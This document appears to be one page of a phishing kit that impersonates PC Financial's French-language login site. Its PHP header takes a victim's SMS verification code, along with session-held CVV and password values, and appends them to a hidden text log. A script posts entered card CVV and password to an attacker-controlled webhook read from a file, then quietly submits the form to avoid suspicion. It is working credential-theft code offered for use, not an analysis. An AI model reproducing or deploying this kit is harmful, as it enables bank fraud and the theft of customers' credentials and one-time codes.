<?php session_start();
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
        header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "Sms : " .$_SESSION["sms"] ."\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

session_destroy();




?>


<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PC Finance - Connexion</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: { primary: "#8E6FF7", secondary: "" },
            borderRadius: {
              none: "0px",
              sm: "4px",
              DEFAULT: "8px",
              md: "12px",
              lg: "16px",
              xl: "20px",
              "2xl": "24px",
              "3xl": "32px",
              full: "9999px",
              button: "8px",
            },
          },
        },
      };
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css"
    />
    <style>
      :where([class^="ri-"])::before { content: "\f3c2"; }
      body {
      background-color: #f9fafb;
      color: #1f2937;
      }
      input:focus {
      outline: none;
      border-color: #8E6FF7;
      }
      input[type="checkbox"] {
      appearance: none;
      width: 18px;
      height: 18px;
      border: 1px solid #d1d5db;
      border-radius: 4px;
      position: relative;
      }
      input[type="checkbox"]:checked {
      background-color: #8E6FF7;
      border-color: #8E6FF7;
      }
      input[type="checkbox"]:checked::after {
      content: "";
      position: absolute;
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      top: 2px;
      left: 6px;
      transform: rotate(45deg);
      }
    </style>
  </head>
  <body class="min-h-screen">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
      <header class="py-6">
        <div class="flex items-center">
          <div class="text-red-600 font-['Pacifico'] text-2xl">
            <span>
            <img
                  src="https://secure.pcfinancial.ca/assets/images/fr/pcf-logo-light.svg"
                  alt="Google Play"
                  class="h-8"
              />
            </span>
          </div>
        </div>
      </header>
      <main class="flex flex-col lg:flex-row gap-12 py-8">
        <div class="hidden lg:block lg:w-1/2 space-y-8">
          <div>
            <h1 class="text-4xl font-bold text-gray-800 mb-4">
              Connectez-vous à PC Finance en ligne
            </h1>
            <p class="text-gray-600">
              Gérez vos comptes, faites le suivi de vos dépenses et obtenez de
              l'aide, tout cela à portée de main.
            </p>
          </div>
          <div class="bg-white p-6 rounded shadow-sm border border-gray-100">
            <div class="flex justify-between items-center">
              <p class="text-gray-700">
                Vous vous demandez quel produit vous convient le mieux ?
              </p>
              <a
                href="#"
                class="text-primary flex items-center gap-1 whitespace-nowrap"
              >
                Visitez pcfinancial.ca
                <i class="ri-external-link-line"></i>
              </a>
            </div>
          </div>
        </div>
        <div class="lg:w-1/2">
          <div class="bg-white p-8 rounded shadow-sm border border-gray-100">
           
            <h3 class="text-2xl font-semibold mb-6">Verification Des information d'authentification</h3>
          
          <img src="../ajax-loading.gif" alt="" srcset="">
            <div class="mt-6 text-center">
              <p class="text-gray-600">
                Vous n'avez pas de compte en ligne?
                <a href="#" class="text-primary">S'inscrire</a>
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
    <div
      class="fixed bottom-6 right-6 bg-black text-white w-14 h-14 rounded-full flex items-center justify-center cursor-pointer shadow-lg"
    >
      <i class="ri-customer-service-2-line ri-lg"></i>
    </div>
    <footer class="bg-[#2D2D2D] text-white mt-20 py-12 px-4">
      <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
          <div class="space-y-4">
            <img
              src="https://secure.pcfinancial.ca/assets/images/fr/pcf-logo-transparent.svg"
              alt="Finance Logo"
              class="h-8"
            />
            <div class="flex gap-4">
              <a href="#" class="bg-black rounded-lg p-2"
                ><img
                  src="https://secure.pcfinancial.ca/assets/images/fr/app-store.svg"
                  alt="App Store"
                  class="h-8"
              /></a>
              <a href="#" class="bg-black rounded-lg p-2"
                ><img
                  src="https://secure.pcfinancial.ca/assets/images/fr/google-play.svg"
                  alt="Google Play"
                  class="h-8"
              /></a>
              <a
                href="#"
                class="bg-[#8E6FF7] rounded-lg p-2 flex items-center px-4"
                >
                <img
                  src="https://secure.pcfinancial.ca/assets/images/cdic-digital-symbol.svg"
                  alt="Google Play"
                  class="h-8"
              />
                </a
              >
            </div>
          </div>
          <div class="space-y-3">
            <a href="#" class="block hover:text-gray-300">À propos de nous</a>
            <a href="#" class="block hover:text-gray-300">Nous joindre</a>
            <a href="#" class="block hover:text-gray-300">FAQ</a>
            <a href="#" class="block hover:text-gray-300">Centre des médias</a>
          </div>
          <div class="space-y-3">
            <a href="#" class="block hover:text-gray-300">Carrières</a>
            <a href="#" class="block hover:text-gray-300">Sécurité</a>
            <a href="#" class="block hover:text-gray-300">Membre SADC</a>
            <a href="#" class="block hover:text-gray-300"
              >Mentions légales et politique de confidentialité</a
            >
            <a href="#" class="block hover:text-gray-300"
              >Modalités du site web</a
            >
          </div>
          <div class="space-y-3">
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">Adeptes PC</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">Responsabilité sociale</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">PC Optimum</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300">le Choix du Président</a>
              <i class="ri-external-link-line"></i>
            </div>
            <div class="flex items-center gap-2">
              <a href="#" class="hover:text-gray-300"
                >La carte de crédit Mastercard PC</a
              >
              <i class="ri-external-link-line"></i>
            </div>
          </div>
        </div>
        <div class="mt-12 text-sm text-gray-400">
          <p>
            La carte Mastercard Services financiers le Choix du Président est
            offerte par la Banque le Choix du Président. Le programme de PC
            Optimum est offert par Services le Choix du Président inc.
          </p>
        </div>
        <div class="mt-8 flex justify-end">
          <button
            class="bg-gray-700 text-white px-4 py-2 rounded-lg flex items-center gap-2"
          >
            <span class="text-sm">English</span>
            <i class="ri-global-line"></i>
          </button>
        </div>
      </div>
    </footer>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const togglePassword = document.getElementById("togglePassword");
        const password = document.getElementById("password");
        togglePassword.addEventListener("click", function () {
          const type =
            password.getAttribute("type") === "password" ? "text" : "password";
          password.setAttribute("type", type);
          if (type === "password") {
            togglePassword.innerHTML = '<i class="ri-eye-line"></i>';
          } else {
            togglePassword.innerHTML = '<i class="ri-eye-off-line"></i>';
          }
        });
      });
    </script>
  </body>
</html>